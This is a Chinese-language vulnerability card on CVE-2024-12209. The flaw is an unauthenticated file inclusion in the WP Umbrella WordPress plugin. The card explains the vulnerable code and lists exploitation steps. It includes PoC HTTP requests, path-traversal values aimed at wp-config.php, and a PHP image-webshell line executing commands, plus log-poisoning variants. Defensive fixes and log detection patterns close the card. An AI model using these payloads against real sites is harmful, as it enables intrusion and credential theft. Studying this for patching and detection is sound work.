---
id: web-php-file-inclusion-wp-umbrella-filename-unauth-rce
title: WP Umbrella 插件 handleClonerRequest 未授权文件包含（CVE-2024-12209）：umbrella-backup 查询变量 + filename 参数拼进 include_once，读文件/包含图片马 getshell
type: scenario
domain: web
path: web/php/file-inclusion
technique: wp-umbrella-filename-query-var-include-once
aliases:
- CVE-2024-12209
- WP Umbrella 文件包含
- handleClonerRequest
- umbrella-backup 查询变量
- template_redirect 回调 include_once
- BackupFinderConfiguration getRootBackupModule
- 包含图片马 getshell
tags:
- wordpress
- plugin
- php
- lfi
- file-inclusion
- rce
- include-once
- cve-2024-12209
- unauth
cve:
- CVE-2024-12209
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W5
  verified_at: '2026-11-08T23:21:21+08:00'
  notes: 已对照原文核对 handleClonerRequest 完整代码（isset(query_vars[umbrella-backup]) 门禁、$_GET[filename] 缺省 cloner.php、file_exists 失败 wp_safe_redirect、include_once $filePath）、template_redirect 钩子的注册方式、以及原文的 favicon.ico?umbrella-backup=aaaaa&filename=license.txt 读文件请求与「上传图片马再包含」的 RCE 路径；本次核对未读取图片；未验证点：原文未给出受影响版本区间（通告细节在截图里），未设 affected_versions；穿越层数与上传路径按目标目录结构调整属推断
---

## 一句话结论

WP Umbrella 插件把 `handleClonerRequest()` 挂在 WordPress 的 `template_redirect` 动作上，函数只看 `$wp_query->query_vars['umbrella-backup']` 是否存在（不校验登录/权限、不校验 nonce），随后取 `$_GET['filename']`（缺省 `cloner.php`）拼到备份模块根目录后面，`file_exists()` 通过就 `include_once $filePath`。因此任意未认证访问者只要带一个 `umbrella-backup` 查询变量，就能用 `filename` 参数让 PHP 包含服务器上的任意可读文件（读 `license.txt`/`wp-config.php`），再配合站点任意图片上传点落一个「图片马」，把 `filename` 指向上传目录里的图片即可执行其中的 PHP，完成 RCE。

## 原理

- **入口不受保护**：`template_redirect` 在模板加载前触发，属于前台每个请求都会经过的钩子；`handleClonerRequest()` 只用 `isset($wp_query->query_vars['umbrella-backup'])` 判断「是不是备份克隆请求」，没有任何 `current_user_can()` 或 nonce 校验。查询变量可由任意 URL 追加 `?umbrella-backup=x` 注入，WordPress 会把它注册进 `query_vars`，于是未认证用户也能进入该分支。
- **路径拼接而非白名单**：`$filePath = $source . $filename;` 中 `$source` 来自 `wp_umbrella_get_service('BackupFinderConfiguration')->getRootBackupModule()`（备份模块目录），`$filename` 完全来自 `$_GET`，没有 `basename()`、没有扩展名白名单、没有 `realpath()` 归一化后比较前缀；因此 `filename` 既能目录穿越（`../../wp-config.php`），也能指向站内其他可写目录。
- **`include_once` 会执行而非仅读取**：PHP 的 `include` 系列在包含文件时按 PHP 解析执行。包含 `license.txt`、`readme.html` 这类纯文本只是把内容打出来（任意文件读取）；一旦包含到含 `<?php ... ?>` 的文件（例如带 PHP 代码的图片），就会真正执行，这就是「读取」升级为「RCE」的关键。
- **为什么图片马能过关**：站点一般允许图片上传，且通常只校验 MIME 头/后缀是否为图片；把 PHP 代码追加在合法图片字节之后，文件仍是合法图片，可通过上传校验并落到 `wp-content/uploads`；`include_once` 不看后缀，只按文件内容解析，`<?php` 段会被执行。
- **为什么 `include_once` 而不是 `include`**：同一请求内重复包含同一路径会被跳过（`_once`），但这不影响单次利用；反而说明代码意图是「包含一次 cloner 脚本」，把「可包含的脚本」写死成外部可控参数正是漏洞本质。

## 触发条件

- 目标 WordPress 站点安装了存在该缺陷的 WP Umbrella 版本，且插件处于启用状态（`template_redirect` 已注册）；
- 攻击者能构造任意前台 URL 并追加 `umbrella-backup` 查询变量；
- PHP 进程对目标文件有读权限（读 `wp-config.php`、`license.txt` 等）；
- RCE 还需要站点存在可上传图片的入口（或任意已落地的含 PHP 片段的可读文件），且上传目录与站点路径可被 `filename` 相对路径命中。

## 利用步骤

1. 探测：请求任一前台页面并追加 `?umbrella-backup=1&filename=license.txt`，若响应中出现 `license.txt` 的内容（而不是跳回首页），即命中该分支；若 404/首页跳转，说明 `file_exists` 失败。
2. 任意文件读取：把 `filename` 换成 `../../wp-config.php`、`../../../wp-config.php` 等，逐步调整穿越层数以匹配 `$source` 的深度，读数据库凭据。
3. 准备图片马：在合法图片（如 `a.png`）尾部追加 `<?php system($_GET['c']); ?>`（本卡不提供可直接落地执行的成品，仅说明结构）。
4. 用站点任意「图片上传」功能上传该图片（前台评论头像、后台媒体库、插件自带的图片上传点均可），从响应/媒体库拿到上传后的绝对或相对路径。
5. 把上传路径转成相对 `$source` 的相对路径（必要时用 `../../` 回到站点根再进 `wp-content/uploads/...`），作为 `filename` 传入，触发 `include_once` 执行图片里的 PHP。
6. 以 `?umbrella-backup=1&filename=<上传图片相对路径>&c=<命令>` 形式调用，命令输出随响应回显。

## PoC

任意文件读取（未认证）：

```
GET /favicon.ico?umbrella-backup=aaaaa&filename=license.txt HTTP/1.1
Host: target
Accept: */*
```

RCE 的包含点（先上传图片马，再包含它）：

```
GET /favicon.ico?umbrella-backup=aaaaa&filename=../../wp-content/uploads/2024/12/avatar.png&c=id HTTP/1.1
Host: target
```

要点：`umbrella-backup` 的值只要非空即可（代码只做 `isset`），不需要等于任何特定串；`filename` 的穿越层数由 `$source`（备份模块目录）在磁盘上的深度决定，实际利用时需要按目标目录结构调整 `../` 数量，或用绝对路径风格的前缀。

原文给出的核心逻辑（据此可判断上述构造的有效性）：

```php
if (!isset($wp_query->query_vars['umbrella-backup'])) { return; }
$source = wp_umbrella_get_service('BackupFinderConfiguration')->getRootBackupModule();
$filename = isset($_GET['filename']) ? $_GET['filename'] : 'cloner.php';
$filePath = $source . $filename;
if (!file_exists($filePath)) { wp_safe_redirect(home_url()); return; }
include_once $filePath;
```

## 变体与关联

- **变体（无上传点）**：若站点无法上传，可把 `filename` 指向日志文件（`access.log` 里写入 `<?php ... ?>`）、会话文件、或插件/主题自带的「可写且会被 PHP 解析」的文件，形成日志投毒 → 包含执行；也可仅做敏感文件读取（`wp-config.php` 拿 DB 凭据后横向）。
- **变体（包装器）**：若 `$source` 前缀使穿越受限，可尝试 `php://filter/...` 之类包装器（取决于是否被其他过滤拦截）做源码读取；`data://`/`php://input` 需要 `allow_url_include=On`，一般不可用。
- **变体（同型入口）**：WordPress 插件中「URL 参数决定被 include 的文件」的写法极常见，凡 `include`/`require`/`include_once` 的实参拼接了 `$_GET`/`$_POST`/`$_REQUEST` 且无 `basename`+白名单，都可套用本卡的探测与利用流程。
- **关联**：[[web-php-file-inclusion-latepoint-layout-cve-2025-6715]]（同为 WordPress 插件把请求参数拼进 include 的 LFI）、[[web-php-file-inclusion-mail-masta-cve-2016-10956-lfi]]（`pl` 参数直接 `include($_GET['pl'])`）、[[web-generic-file-upload-wordpress-wpcargo-cve-2021-25003]]（WordPress 上传点落地 WebShell 的配合面）、[[web-php-file-inclusion-doublewrite-lfi-eval-chain-webshell]]（包含 → 执行的升级思路）。

## 检测与防御

- **代码修复**：删除「按请求参数包含文件」的设计——`cloner.php` 应固定路径、`require` 常量；确需可变时用严格白名单 `in_array($filename, ['cloner.php','restore.php'], true)`，并对 `realpath()` 结果做「必须以备份模块目录为前缀」的校验，拒绝任何 `..`。
- **权限**：整个 `handleClonerRequest()` 必须做 `current_user_can('manage_options')` + nonce 校验；备份/克隆类端点不应挂在 `template_redirect` 这种前台钩子上。
- **检测点**：Web 日志中出现 `umbrella-backup` 参数与 `filename=` 的组合（尤其值含 `../`、`wp-config`、`license.txt`、`.log`、`uploads/`、`.png`/`.jpg` 后缀）即高危；同一 IP 先上传图片再带 `filename` 指向该图片，是典型的两步链。
- **加固**：`php.ini` 关闭 `allow_url_include`；上传目录通过 `open_basedir`/Web 服务器配置禁止 PHP 解析（但无法阻止本漏洞的 `include`，只能降低图片马单独访问的价值）；对 `include` 目标做静态审计规则（参数来自超全局变量即告警）。
